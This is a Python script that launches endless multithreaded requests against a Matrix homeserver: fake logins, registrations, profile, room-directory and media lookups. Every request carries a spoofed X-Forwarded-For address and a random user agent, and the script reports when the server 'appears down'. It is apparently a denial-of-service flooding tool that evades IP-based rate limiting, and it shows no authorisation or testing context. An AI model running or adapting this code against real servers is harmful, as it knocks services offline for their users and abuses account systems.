import requests
import threading
import random
import time
from termcolor import colored
from faker import Faker

# Initialize faker
fake = Faker()

# Get base URL of Matrix homeserver
base_url = input("Enter base URL of Matrix homeserver: ")

# Ask number of concurrent threads
num_threads = int(input("Enter number of concurrent threads: "))

# Endpoints
endpoints = {
    "login_types": "/_matrix/client/v3/login",
    "room_directory": "/_matrix/client/v3/directory/list/room/{roomId}",
    "user_profile": "/_matrix/client/v3/profile/{userId}",
    "public_aliases": "/_matrix/client/v3/directory/room/{roomAlias}",
    "username_available": "/_matrix/client/v3/register/available",
    "register": "/_matrix/client/v3/register",
    "public_rooms": "/_matrix/client/v3/publicRooms",
    "avatar_url": "/_matrix/client/v3/profile/{userId}/avatar_url",
    "displayname": "/_matrix/client/v3/profile/{userId}/displayname",
    "media_download": "/_matrix/media/v3/download/{serverName}/{mediaId}/{fileName}",
    "media_thumbnail": "/_matrix/media/v3/thumbnail/{serverName}/{mediaId}"
}

# Login with fake data
def post_login():
    while True:
        url = base_url + endpoints["login_types"]
        headers = {
            "Content-Type": "application/json",
            "X-Forwarded-For": fake.ipv4(),
            "User-Agent": fake.user_agent()
        }
        data = {
            "type": "m.login.password",
            "identifier": {
                "type": "m.id.user",
                "user": fake.user_name()
            },
            "password": fake.password()
        }
        try:
            response = requests.post(url, headers=headers, json=data)
            if response.status_code == 200:
                print(colored(f"POST {response.status_code}: {url}", 'green'))
            elif response.status_code == 403:
                print(colored(f"POST Fake Login: {url}", 'green'))
            elif response.status_code == 401:
                print(colored(f"POST Fake Login: {url}", 'green'))
            elif response.status_code in [502, 503, 504]:
                print(colored("Matrix homeserver appears down!", 'red'))
            else:
                print(colored(f"POST {response.status_code}: {url}", 'green'))
        except Exception as e:
            print(colored(f"ERROR: {str(e)}", 'red'))
        time.sleep(random.uniform(0.05, 0.5))  

# Get room visibility with fake data
def get_room_visibility():
    while True:
        room_id = f"!{fake.uuid4()}:{fake.domain_name()}"
        url = base_url + endpoints["room_directory"].format(roomId=room_id)
        headers = {
            "Content-Type": "application/json",
            "X-Forwarded-For": fake.ipv4(),
            "User-Agent": fake.user_agent()
        }
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                print(colored(f"GET {response.status_code}: {url}", 'green'))
            elif response.status_code == 404 and response.json().get("errcode") == "M_NOT_FOUND":
                print(colored(f"GET Fake Room: {url}", 'green'))
            elif response.status_code == 500:
                print(colored(f"GET Fake Room: {url}", 'green'))
            elif response.status_code in [502, 503, 504]:
                print(colored("Matrix homeserver appears down!", 'red'))
                print(colored(f"Response Content: {response.content}", 'red'))
            else:
                print(colored(f"GET {response.status_code}: {url}", 'green'))
                print(colored(f"Response Content: {response.content}", 'green'))
        except Exception as e:
            print(colored(f"ERROR: {str(e)}", 'red'))
        time.sleep(random.uniform(0.05, 0.5))  

# Get user profile with fake data
def get_user_profile():
    while True:
        user_id = f"@{fake.user_name()}:{fake.domain_name()}"
        url = base_url + endpoints["user_profile"].format(userId=user_id)
        headers = {
            "Content-Type": "application/json",
            "X-Forwarded-For": fake.ipv4(),
            "User-Agent": fake.user_agent()
        }
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                print(colored(f"GET {response.status_code}: {url}", 'green'))
            elif response.status_code == 404 and response.json().get("errcode") == "M_NOT_FOUND":
                print(colored(f"GET {response.status_code} (User Not Found): {url}", 'green'))
            elif response.status_code == 500:
                print(colored(f"GET Fake User Profile: {url}", 'green'))
            elif response.status_code in [502, 503, 504]:
                print(colored("Matrix homeserver appears down!", 'red'))
                print(colored(f"Response Content: {response.content}", 'red'))
            else:
                print(colored(f"GET {response.status_code}: {url}", 'green'))
                print(colored(f"Response Content: {response.content}", 'green'))
        except Exception as e:
            print(colored(f"ERROR: {str(e)}", 'red'))
        time.sleep(random.uniform(0.05, 0.5))  

# Check username availability with fake data
def check_username_availability():
    while True:
        username = fake.user_name()
        url = f"{base_url}{endpoints['username_available']}?username={username}"
        headers = {
            "Content-Type": "application/json",
            "X-Forwarded-For": fake.ipv4(),
            "User-Agent": fake.user_agent()
        }
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                print(colored(f"GET Fake Username Availability: {url}", 'green'))
            elif response.status_code == 400:
                error_code = response.json().get("errcode")
                if error_code == "M_USER_IN_USE":
                    print(colored(f"GET {response.status_code}: {url} - Username in use", 'green'))
                elif error_code == "M_INVALID_USERNAME":
                    print(colored(f"GET {response.status_code}: {url} - Invalid Username", 'green'))
                elif error_code == "M_EXCLUSIVE":
                    print(colored(f"GET {response.status_code}: {url} - Username in exclusive namespace", 'green'))
                else:
                    print(colored(f"GET {response.status_code}: {url}", 'green'))
            elif response.status_code == 429:
                retry_after = response.json().get("retry_after_ms", 1000) / 1000.0
                print(colored(f"GET {response.status_code}: {url} - Rate limited, retrying after {retry_after} seconds", 'green'))
                time.sleep(retry_after)
                continue
            elif response.status_code == 500:
                print(colored(f"GET Fake Username Availability: {url}", 'green'))
            elif response.status_code in [502, 503, 504]:
                print(colored("Matrix homeserver appears down!", 'red'))
                print(colored(f"Response Content: {response.content}", 'red'))
            else:
                print(colored(f"GET {response.status_code}: {url}", 'green'))
                print(colored(f"Response Content: {response.content}", 'green'))
        except Exception as e:
            print(colored(f"ERROR: {str(e)}", 'red'))
        time.sleep(random.uniform(0.05, 0.5))  

# Register a user with fake data
def post_register():
    while True:
        url = base_url + endpoints["register"]
        headers = {
            "Content-Type": "application/json",
            "X-Forwarded-For": fake.ipv4(),
            "User-Agent": fake.user_agent()
        }
        initial_data = {
            "username": fake.user_name(),
            "password": fake.password(),
            "auth": {
                "type": "m.login.dummy"
            }
        }
        try:
            # Initial registration attempt
            response = requests.post(url, headers=headers, json=initial_data)
            if response.status_code == 200:
                print(colored(f"POST {response.status_code}: {url}", 'green'))
            elif response.status_code == 401:
                response_json = response.json()
                print(colored(f"POST Fake Registration: {url}", 'green'))

                # Add fake token and retry registration
                session = response_json.get('session')
                token_data = {
                    "username": initial_data["username"],
                    "password": initial_data["password"],
                    "auth": {
                        "type": "m.login.registration_token",
                        "session": session,
                        "token": "FAKE_TOKEN"
                    }
                }
                token_response = requests.post(url, headers=headers, json=token_data)
                if token_response.status_code == 200:
                    print(colored(f"POST {token_response.status_code}: {url} with token", 'green'))
                elif token_response.status_code == 500:
                    print(colored(f"POST Fake Registration: {url}", 'green'))
                elif token_response.status_code in [502, 503, 504]:
                    print(colored("Matrix homeserver appears down!", 'red'))
                else:
                    print(colored(f"POST Fake Registration: {url}", 'green'))
            elif response.status_code in [502, 503, 504]:
                print(colored("Matrix homeserver appears down!", 'red'))
            else:
                print(colored(f"POST {response.status_code}: {url}", 'green'))
        except Exception as e:
            print(colored(f"ERROR: {str(e)}", 'red'))
        time.sleep(random.uniform(0.5, 2.5))  

# Get public rooms
def get_public_rooms():
    while True:
        url = base_url + endpoints["public_rooms"]
        headers = {
            "Content-Type": "application/json",
            "X-Forwarded-For": fake.ipv4(),
            "User-Agent": fake.user_agent()
        }
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                print(colored("GET Public Rooms", 'green'))
            elif response.status_code == 500:
                print(colored(f"GET Fake Public Rooms: {url}", 'green'))
            elif response.status_code in [502, 503, 504]:
                print(colored("Matrix homeserver appears down!", 'red'))
                print(colored(f"Response Content: {response.content}", 'red'))
            else:
                print(colored(f"GET {response.status_code}: {url}", 'green'))
                print(colored(f"Response Content: {response.content}", 'green'))
        except Exception as e:
            print(colored(f"ERROR: {str(e)}", 'red'))
        time.sleep(random.uniform(0.05, 0.5))  

# Get user avatar URL with fake data
def get_avatar_url():
    while True:
        user_id = f"@{fake.user_name()}:{fake.domain_name()}"
        url = base_url + endpoints["avatar_url"].format(userId=user_id)
        headers = {
            "Content-Type": "application/json",
            "X-Forwarded-For": fake.ipv4(),
            "User-Agent": fake.user_agent()
        }
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                print(colored(f"GET {response.status_code}: {url}", 'green'))
            elif response.status_code == 404 and response.json().get("errcode") == "M_NOT_FOUND":
                print(colored(f"GET {response.status_code} (Avatar URL Not Found): {url}", 'green'))
            elif response.status_code == 500:
                print(colored(f"GET Fake Avatar URL: {url}", 'green'))
            elif response.status_code in [502, 503, 504]:
                print(colored("Matrix homeserver appears down!", 'red'))
                print(colored(f"Response Content: {response.content}", 'red'))
            else:
                print(colored(f"GET {response.status_code}: {url}", 'green'))
                print(colored(f"Response Content: {response.content}", 'green'))
        except Exception as e:
            print(colored(f"ERROR: {str(e)}", 'red'))
        time.sleep(random.uniform(0.05, 0.5))  

# Get user display name with fake data
def get_displayname():
    while True:
        user_id = f"@{fake.user_name()}:{fake.domain_name()}"
        url = base_url + endpoints["displayname"].format(userId=user_id)
        headers = {
            "Content-Type": "application/json",
            "X-Forwarded-For": fake.ipv4(),
            "User-Agent": fake.user_agent()
        }
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                print(colored(f"GET {response.status_code}: {url}", 'green'))
            elif response.status_code == 404 and response.json().get("errcode") == "M_NOT_FOUND":
                print(colored(f"GET {response.status_code} (Display Name Not Found): {url}", 'green'))
            elif response.status_code == 500:
                print(colored(f"GET Fake Display Name: {url}", 'green'))
            elif response.status_code in [502, 503, 504]:
                print(colored("Matrix homeserver appears down!", 'red'))
                print(colored(f"Response Content: {response.content}", 'red'))
            else:
                print(colored(f"GET {response.status_code}: {url}", 'green'))
                print(colored(f"Response Content: {response.content}", 'green'))
        except Exception as e:
            print(colored(f"ERROR: {str(e)}", 'red'))
        time.sleep(random.uniform(0.05, 0.5))  

# Download media with fake data
def get_media_download():
    while True:
        server_name = fake.domain_name()
        media_id = fake.uuid4()
        file_name = f"{fake.word()}.png"
        url = base_url + endpoints["media_download"].format(serverName=server_name, mediaId=media_id, fileName=file_name)
        headers = {
            "Content-Type": "application/json",
            "X-Forwarded-For": fake.ipv4(),
            "User-Agent": fake.user_agent()
        }
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                print(colored(f"GET {response.status_code}: {url}", 'green'))
            elif response.status_code == 500:
                print(colored(f"GET Fake Media Download: {url}", 'green'))
            elif response.status_code in [502, 503, 504]:
                print(colored("Matrix homeserver appears down!", 'red'))
                print(colored(f"Response Content: {response.content}", 'red'))
            else:
                print(colored(f"GET {response.status_code}: {url}", 'green'))
                print(colored(f"Response Content: {response.content}", 'green'))
        except Exception as e:
            print(colored(f"ERROR: {str(e)}", 'red'))
        time.sleep(random.uniform(0.05, 0.5))  

# Get media thumbnail with fake data
def get_media_thumbnail():
    while True:
        server_name = fake.domain_name()
        media_id = fake.uuid4()
        width = random.randint(10, 1000)
        height = random.randint(10, 1000)
        url = f"{base_url}{endpoints['media_thumbnail'].format(serverName=server_name, mediaId=media_id)}?width={width}&height={height}"
        headers = {
            "X-Forwarded-For": fake.ipv4(),
            "User-Agent": fake.user_agent()
        }
        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                print(colored(f"GET {response.status_code}: {url}", 'green'))
            elif response.status_code == 500:
                print(colored(f"GET Fake Media Thumbnail: {url}", 'green'))
            elif response.status_code in [502, 503, 504]:
                print(colored("Matrix homeserver appears down!", 'red'))
                print(colored(f"Response Content: {response.content}", 'red'))
            else:
                print(colored(f"GET {response.status_code}: {url}", 'green'))
                print(colored(f"Response Content: {response.content}", 'green'))
        except Exception as e:
            print(colored(f"ERROR: {str(e)}", 'red'))
        time.sleep(random.uniform(0.05, 0.5))  

# Create a list of threads
threads = []

# Allocate threads for each type of request equally
for i in range(num_threads // 11):
    thread = threading.Thread(target=post_login)
    thread.start()
    threads.append(thread)

for i in range(num_threads // 11):
    thread = threading.Thread(target=get_room_visibility)
    thread.start()
    threads.append(thread)

for i in range(num_threads // 11):
    thread = threading.Thread(target=check_username_availability)
    thread.start()
    threads.append(thread)

for i in range(num_threads // 11):
    thread = threading.Thread(target=post_register)
    thread.start()
    threads.append(thread)

for i in range(num_threads // 11):
    thread = threading.Thread(target=get_public_rooms)
    thread.start()
    threads.append(thread)

for i in range(num_threads // 11):
    thread = threading.Thread(target=get_avatar_url)
    thread.start()
    threads.append(thread)

for i in range(num_threads // 11):
    thread = threading.Thread(target=get_displayname)
    thread.start()
    threads.append(thread)

for i in range(num_threads // 11):
    thread = threading.Thread(target=get_media_download)
    thread.start()
    threads.append(thread)

for i in range(num_threads // 11):
    thread = threading.Thread(target=get_media_thumbnail)
    thread.start()
    threads.append(thread)

for i in range(num_threads // 11):
    thread = threading.Thread(target=get_user_profile)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
